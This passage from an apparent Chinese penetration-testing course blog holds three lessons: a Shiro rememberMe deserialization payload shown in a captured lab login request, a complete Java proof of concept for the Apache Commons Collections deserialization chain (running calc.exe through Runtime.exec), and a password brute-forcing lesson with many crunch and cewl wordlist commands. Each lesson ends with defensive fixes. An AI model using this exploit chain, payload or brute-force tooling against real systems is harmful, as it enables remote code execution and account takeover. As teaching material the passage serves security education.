</p><p><code>rememberMe=+DcRVRC3TxGKeuGHa4TZSWqqLtQGyPvE0mjicSb4nm6nUdC6PwNxo6ZgbQLuHr8wq3ECYQVLqKXaECtmKQhW91hbrn3XgJzn3XRUgNEciP3dQpQcOO1ID+vsns3qmyd6SMva5e+cX7z74AwVAK2i0cwc/AmnVUV/oCdA9nHPcb6b5EH23bkrLuafb5Ij7e6t+X1pZunOUFbquQqrBCW4D+hmUS+g93brv5cpLDmR5DWkh7yqWyTXMWKzZqRP0iW/x1gOFVZ3wPv2CYZhvQlH3jpk7nxq5gf5rfCgQ7T8R7OJ66zQc92gx0kbInRJ/QT3v19RF3Jn/q7fBGyX2/LDDdjPzd4DYBMj3CgH3Cx4FuElMv4364VTknFZqVj4gMsfGS2OA9NZ/2jVIFhTdhvU3w==</code> </p><h3 id="Burp抓包"><a href="#Burp抓包" class="headerlink" title="Burp抓包"></a>Burp抓包</h3><p>勾选remember me，火狐浏览器抓登录的包 </p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-none"><code class="language-none">POST /doLogin HTTP/1.1Host: 192.168.142.128:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101Firefox/98.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-formurlencodedContent-Length: 47Origin: http://192.168.142.128:8080Connection: closeReferer: http://192.168.142.128:8080/doLoginCookie: JSESSIONID=BE2042921ED0A1E58436F6FBD5654581;rememberMe=+DcRVRC3TxGKeuGHa4TZSWqqLtQGyPvE0mjicSb4nm6nUdC6PwNxo6ZgbQLuHr8wq3ECYQVLqKXaECtmKQhW91hbrn3XgJzn3XRUgNEciP3dQpQcOO1ID+vsns3qmyd6SMva5e+cX7z74AwVAK2i0cwc/AmnVUV/oCdA9nHPcb6b5EH23bkrLuafb5Ij7e6t+X1pZunOUFbquQqrBCW4D+hmUS+g93brv5cpLDmR5DWkh7yqWyTXMWKzZqRP0iW/x1gOFVZ3wPv2CYZhvQlH3jpk7nxq5gf5rfCgQ7T8R7OJ66zQc92gx0kbInRJ/QT3v19RF3Jn/q7fBGyX2/LDDdjPzd4DYBMj3CgH3Cx4FuElMv4364VTknFZqVj4gMsfGS2OA9NZ/2jVIFhTdhvU3w==Upgrade-Insecure-Requests: 1username=admi&amp;password=n&amp;rememberme=remember-me<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="修复与防御"><a href="#修复与防御" class="headerlink" title="修复与防御"></a>修复与防御</h1><ol><li><p>升级Shiro </p></li><li><p>安全产品 </p></li><li><p>防御工具库 </p><p><a href="https://github.com/ikkisoft/SerialKiller">https://github.com/ikkisoft/SerialKiller</a></p></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/21-fan-xu-lie-hua/apache-commons-collections-fan-xu-lie-hua/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/21-fan-xu-lie-hua/apache-commons-collections-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞爆出"><a href="#漏洞爆出" class="headerlink" title="漏洞爆出"></a>漏洞爆出</h2><ul><li>2015.01.28 Gabriel Lawrence和Chris Frohoff</li></ul><p><a href="https://speakerdeck.com/frohoff/appseccali-2015-marshalling-pickles-how-deserializing-objects-can-ruin-your-day">https://speakerdeck.com/frohoff/appseccali-2015-marshalling-pickles-how-deserializing-objects-can-ruin-your-day</a> </p><p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a> </p><ul><li>2015.11.06 FoxGlove Security @breenmachine</li></ul><p><a href="https://commons.apache.org/proper/commons-collections/release_3_2_2.html">https://commons.apache.org/proper/commons-collections/release_3_2_2.html</a> </p><p><a href="https://issues.apache.org/jira/browse/COLLECTIONS-580">https://issues.apache.org/jira/browse/COLLECTIONS-580</a></p><h2 id="本地复现环境"><a href="#本地复现环境" class="headerlink" title="本地复现环境"></a>本地复现环境</h2><ul><li>jdk 1.7.0_80</li><li>IDEA Project Structrure、Settings——Java compile等设置成java7</li><li>Apache Commons Collections ≤ 3.2.</li></ul><h1 id="课程目录"><a href="#课程目录" class="headerlink" title="课程目录"></a>课程目录</h1><ol><li>Apache Commons Collections介绍 </li><li>Java反射机制 </li><li>Apache Commons Collections漏洞原理 </li><li>漏洞修复</li></ol><h1 id="Apache-Commons-Collections介绍"><a href="#Apache-Commons-Collections介绍" class="headerlink" title="Apache Commons Collections介绍"></a>Apache Commons Collections介绍</h1><h2 id="Java集合"><a href="#Java集合" class="headerlink" title="Java集合"></a>Java集合</h2><p>List</p><p>Map </p><p>Set</p><p><img src="/assets/image-20221127162108970.png" alt="image-20221127162108970"></p><h2 id="Commons-Collection"><a href="#Commons-Collection" class="headerlink" title="Commons Collection"></a>Commons Collection</h2><p><a href="https://commons.apache.org/proper/commons-collections/">https://commons.apache.org/proper/commons-collections/</a> </p><ul><li><strong>Bag interface</strong> for collections that have a number of copies of each object </li><li><strong>BidiMap interface</strong> for maps that can be looked up from value to key as well and key to value </li><li><strong>MapIterator</strong> interface to provide simple and quick iteration over maps </li><li><strong>Transforming decorators</strong> that alter each object as it is added to the collection </li><li><strong>Composite collections</strong> that make multiple collections look like one </li><li><strong>Ordered maps</strong> and sets that retain the order elements are added in, including an LRU based map </li><li><strong>Reference map</strong> that allows keys and/or values to be garbage collected under close control </li><li>Many <strong>comparator</strong> implementations </li><li>Many <strong>iterator</strong> implementations </li><li><strong>Adapter classes</strong> from array and enumerations to collections </li><li><strong>Utilities</strong> to test or create typical set-theory properties of collections such as union, intersection, and closure</li></ul><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;&lt;groupId&gt;commons-collections&lt;/groupId&gt;&lt;artifactId&gt;commons-collections&lt;/artifactId&gt;&lt;version&gt;3.1&lt;/version&gt;&lt;/dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="可能出现的问题"><a href="#可能出现的问题" class="headerlink" title="可能出现的问题"></a>可能出现的问题</h2><ol><li>哪里出现了可以<strong>执行任意代码</strong>的问题？ </li><li>序列化的payload怎么构造？</li></ol><h1 id="Java反射机制"><a href="#Java反射机制" class="headerlink" title="Java反射机制"></a>Java反射机制</h1><h2 id="JVM"><a href="#JVM" class="headerlink" title="JVM"></a>JVM</h2><p>Java代码运行原理： </p><ol><li>源码 </li><li>编译器（javac）编译为字节码.class文件</li><li>各平台JVM解释器把字节码文件转换成操作系统指令</li></ol><h2 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h2><pre class="line-numbers language-none"><code class="language-none">Person obj= new Person("wuya", 666);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><p>在程序运行的时候动态创建一个类的实例， </p><p>调用实例的方法和访问它的属性 </p><pre class="line-numbers language-none"><code class="language-none">Class —— Instance Person —— new Person("无涯")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="Apache-Commons-Collections-漏洞原理-≤-3-2"><a href="#Apache-Commons-Collections-漏洞原理-≤-3-2" class="headerlink" title="Apache Commons Collections 漏洞原理 ≤ 3.2."></a>Apache Commons Collections 漏洞原理 ≤ 3.2.</h1><h2 id="CC漏洞"><a href="#CC漏洞" class="headerlink" title="CC漏洞"></a>CC漏洞</h2><ul><li>2015年黑客Gabriel Lawrence和Chris Frohoff发现 </li><li>影响WebLogic、WebSphere、JBoss、Jenkins、 OpenNMS等大型框架</li></ul><h2 id="CC关键类"><a href="#CC关键类" class="headerlink" title="CC关键类"></a>CC关键类</h2><ul><li>InvokeTransformer</li></ul><p>利用Java反射机制来创建类实例 </p><ul><li>ChainedTransformer</li></ul><p>实现了Transformer链式调用，我们只需要传入一个Transformer数组 ChainedTransformer就可以实现依次的去调用每一个Transformer的 transform()方法 </p><ul><li>ConstantTransformer transform()</li></ul><p>返回构造函数的对象 </p><ul><li>TransformedMa</li></ul><h2 id="调用链路"><a href="#调用链路" class="headerlink" title="调用链路"></a>调用链路</h2><p><img src="/assets/image-20221127163102008.png" alt="image-20221127163102008"></p><h2 id="poc构造思路"><a href="#poc构造思路" class="headerlink" title="poc构造思路"></a>poc构造思路</h2><ol><li><p>InvokeTransformer </p><p>反射执行代码 </p></li><li><p>ChainedTransformer</p><p>链式调用，自动触发 </p></li><li><p>ConstantTransformer </p><p>获得对象 </p></li><li><p>TransformedMap</p><p>元素变化执行transform，setValue——checkSetValue </p></li><li><p>AnnotationInvocationHandler readObject </p><p>调用Map的setValue</p></li></ol><h2 id="poc源码"><a href="#poc源码" class="headerlink" title="poc源码"></a>poc源码</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>wuya<span class="token punctuation">.</span>apache</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">TransformedMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Target</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token comment">/** * 封装为TransformedMap */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Poc</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                    <span class="token comment">// 获得Runtime类对象</span>                    <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token comment">// 传入Runtime类对象 反射执行getMethod获得getRuntime方法</span>                    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span>                            <span class="token string">"getMethod"</span><span class="token punctuation">,</span>                            <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                            <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span>                    <span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token comment">// 传入getRuntime方法对象 反射执行invoke方法 得到Runtime实例</span>                    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span>                            <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                            <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span>                    <span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token comment">// 传入Runtime实例 执行exec方法</span>                    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span>                            <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                            <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc.exe"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span><span class="token punctuation">;</span>            <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Map</span> innermap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            innermap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Map</span> outermap <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innermap<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 构造包含恶意map的AnnotationInvocationHandler对象</span>            <span class="token class-name">Class</span> cl <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Constructor</span> cst <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cst<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> exploitObj <span class="token operator">=</span> cst<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Target</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> outermap<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 序列化</span>            <span class="token class-name">FileOutputStream</span> fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"payload.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fos<span class="token punctuation">)</span><span class="token punctuation">;</span>            oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>exploitObj<span class="token punctuation">)</span><span class="token punctuation">;</span>            oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 反序列化</span>            <span class="token class-name">FileInputStream</span> fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"payload.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fis<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> result <span class="token operator">=</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            ois<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="调用流程"><a href="#调用流程" class="headerlink" title="调用流程"></a>调用流程</h1><ol><li>对利用类AnnotationInvocationHandler进行序列化，然后交给Java程序 反序列化 </li><li>在进行反序列化时，会执行readObject()方法，该方法会用setValue对成 员变量TransformedMap的Value值进行修改 </li><li>value修改触发了TransformedMap实例化时传入的参数 InvokerTransformer的checkSetValue——transform()方法 </li><li>放到Map里面的是InvokeTransformer数组，transform()方法被依次调用 </li><li>InvokerTransformer.transform()方法通过反射，调用 Runtime.getRuntime.exec(“xx”)函数来执行系统命令</li></ol><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ol><li>升级Apache Commons Collections到最新版 </li><li>升级JDK版本</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/18-mi-ma-bao-li-cai-jie/mi-ma-bao-li-po-jie/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/18-mi-ma-bao-li-cai-jie/mi-ma-bao-li-po-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="密码安全概述"><a href="#密码安全概述" class="headerlink" title="密码安全概述"></a>密码安全概述</h1><h2 id="密码（password）的作用"><a href="#密码（password）的作用" class="headerlink" title="密码（password）的作用"></a>密码（password）的作用</h2><ol><li>加密 </li><li>完整性 </li><li>身份认证（口令）</li></ol><h2 id="密码安全的分类"><a href="#密码安全的分类" class="headerlink" title="密码安全的分类"></a>密码安全的分类</h2><ol><li>存储安全 </li><li>传输安全 </li><li>输入安全（登录界面）</li></ol><h2 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h2><ol><li>认证：你是谁 </li><li>授权：你能做什么</li></ol><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol><li>从数据库获取密码，解密 </li><li>窃听通信数据数据，解密 </li><li>直接从登录框猜测密码</li></ol><h1 id="不安全的密码"><a href="#不安全的密码" class="headerlink" title="不安全的密码"></a>不安全的密码</h1><h2 id="默认密码"><a href="#默认密码" class="headerlink" title="默认密码"></a>默认密码</h2><ul><li>000000 </li><li>123456 </li><li>空密码 </li><li>身份证号后六位 </li><li>手机号后六位</li></ul><h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p><a href="https://nordpass.com/most-common-passwords-list/">https://nordpass.com/most-common-passwords-list/</a></p><h1 id="密码猜解思路"><a href="#密码猜解思路" class="headerlink" title="密码猜解思路"></a>密码猜解思路</h1><h2 id="猜测范围"><a href="#猜测范围" class="headerlink" title="猜测范围"></a>猜测范围</h2><ol><li>密码长度 </li><li>密码内容 0-9 a-z A-Z !@#$%^&amp;*</li></ol><h2 id="APP密码范围"><a href="#APP密码范围" class="headerlink" title="APP密码范围"></a>APP密码范围</h2><p><img src="/assets/image-20221208105458299.png" alt="image-20221208105458299"></p><h1 id="字典wordlist"><a href="#字典wordlist" class="headerlink" title="字典wordlist"></a>字典wordlist</h1><h2 id="字典从哪里来？"><a href="#字典从哪里来？" class="headerlink" title="字典从哪里来？"></a>字典从哪里来？</h2><p>通用字典（word list、dict）： </p><ol><li>Kali自带 </li><li>网络下载（百度、github）</li></ol><p>注意使用场合：比如Web网站密码字典、WiFi密码字典、 操作系统用户密码字典、数据库密码字典……</p><h2 id="专用字典"><a href="#专用字典" class="headerlink" title="专用字典"></a>专用字典</h2><ul><li>指定格式字典，比如生日、手机号、QQ号</li></ul><p><code>crunch -h</code> </p><ul><li>社工字典</li></ul><p><code>cupp</code>,<code>ccupp</code> </p><ul><li>文章内容字典</li></ul><p><code>cewl https://sqlmap.org -w dict.txt</code></p><h2 id="kali-crun"><a href="#kali-crun" class="headerlink" title="kali crun"></a>kali crun</h2><p><img src="/assets/image-20221208105751125.png" alt="image-20221208105751125"></p><h2 id="crunch案例"><a href="#crunch案例" class="headerlink" title="crunch案例"></a>crunch案例</h2><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td>crunch 1 8</td><td>第一个是a，最后一个是zzzzzzzz</td></tr><tr><td>crunch 1 6 abcdefg</td><td>第一个是a，最后一个是gggggg</td></tr><tr><td>crunch 1 6 abcdefg\</td><td>第一个是a，最后一个是6个空格也可以写成 “ abcdefg “</td></tr><tr><td>crunch 1 8 -f charset.lst mixalpha-numericall-space -o wordlist.txt</td><td>第一个是a，最后一个是8个空格 /usr/share/crunch/charset.lst</td></tr><tr><td>crunch 8 8 -f charset.lst mixalpha-numericall-space -o wordlist.txt -t @@dog@@@ -s cbdogaaa</td><td>从cbdogaaa开始，到” dog “结束</td></tr><tr><td>crunch 2 3 -f charset.lst ualpha -s BB</td><td>BB开始，ZZZ结束</td></tr><tr><td>crunch 4 5 -p abc</td><td>（排列组合）生成abc, acb, bac, bca, cab, cba这个时候数字无用</td></tr><tr><td>crunch 4 5 -p dog cat</td><td>（排列组合）生成birdcatdog, birddogcat, catbirddog, catdogbird, dogbirdcat, dogcatbir</td></tr><tr><td>crunch 1 5 -o START -c 6000 -z bzip2</td><td>每个txt文件包含6000个单词，用bzip2压缩文件名： first_word-last_word.txt.bz2bzip2 -d解压</td></tr><tr><td>crunch 4 5 -b 20mib -o START</td><td>生成aaaa-gvfed.txt, gvfee-ombqy.txt, ombqz-wcydt.txt, wcydu-zzzzz.txt每个文件呢20M，最后一个是实际大小</td></tr><tr><td>crunch 3 3 abc  + 123 !@# -t @^</td><td>3位长度，格式：小写、数字、字符内容顺序：小写、大写、数 字、符号大写在格式中不包括，用+占位小写包含：abc数字包含： 123符号包含：!@#从a1!开始，c3#结束</td></tr><tr><td>crunch 3 3 abc + 123 !@# -t ^%@</td><td>格式：字符、数字、小写字母</td></tr><tr><td>crunch 4 4 + + 123 + -t %%@^</td><td>4位，格式：数字、数字、小写字母、字符内容顺序：小写、大 写、数字、符号除了数字只有123以外，其他的都不限制从11a! 开始到”33z “结束</td></tr><tr><td>crunch 5 5 -t ddd@@ -o j -p dog cat bird</td><td>从birdcatdogaa开始到dogcatbirdzz结束</td></tr><tr><td>crunch 7 7 -t p@ss,%^ -l a@aaaa</td><td>格式：p@ss大写数字符号@ 小写字母, 大写字母% 数字^ 字符-l 表明该字符为实义字符 从p@ssA0!开始到p@ssZ9 结束</td></tr><tr><td>crunch 5 5 -s @4#S2 -t @%^,2 -e @8 Q2 -l @dddd -b 10KB -o START 有空格 要加双引号</td><td>-s起始字符-e结束字符格式：@数字符号大写2从@4#S2开始，到 @8 Q2结束</td></tr><tr><td>crunch 5 5 -d 2@ -t @@@%%</td><td>从aab00到zzy99-d 限制相同元素出现的次数</td></tr><tr><td>crunch 10 10 -t @@@^%%%%^^ -d 2@ -d 3% -b 20mb -o START ll -h</td><td>从aab!0001!!开始到zzy 9998 结束每个文件20</td></tr><tr><td>crunch 8 8 -d 2@</td><td>从aabaabaa到zzyzzyzz</td></tr><tr><td>crunch 4 4 -f /usr/share/crunch/unicode_test.lst japanese -t @@%% -l @xdd 下载： <a href="https://github.com/jaalto/external-sf--crunch-wordlist">https://github.com/jaalto/external-sf--crunch-wordlist</a></td><td>从@日00开始，到@語99结束</td></tr></tbody></table><h1 id="python实现暴力破解"><a href="#python实现暴力破解" class="headerlink" title="python实现暴力破解"></a>python实现暴力破解</h1><h2 id="python暴破"><a href="#python暴破" class="headerlink" title="python暴破"></a>python暴破</h2><ol><li>从字典读取值，生成密码 </li><li>HTTP连接到需要暴破的地址 </li><li>获得HTTP响应，分析响应结果，看看有没有错误提示 “Username and/or password incorrect.” </li><li>如果有提示，就继续下一次循环 </li><li>如果没有，就代表暴破成功</li></ol><h1 id="Burp-Suite实现暴力破解"><a href="#Burp-Suite实现暴力破解" class="headerlink" title="Burp Suite实现暴力破解"></a>Burp Suite实现暴力破解</h1><p>Intruder 攻击模式</p><h1 id="密码暴力破解的防御"><a href="#密码暴力破解的防御" class="headerlink" title="密码暴力破解的防御"></a>密码暴力破解的防御</h1><h2 id="暴力破解防御"><a href="#暴力破解防御" class="headerlink" title="暴力破解防御"></a>暴力破解防御</h2><ol><li>sleep </li><li>Token </li><li>限制尝试次数，锁定账户</li><li>二次验证</li><li>reCAPTCHA（IP验证）</li><li>行为识别</li><li>WAF</li><li>强制修改密码</li><li>取消密码登录</li></ol><h2 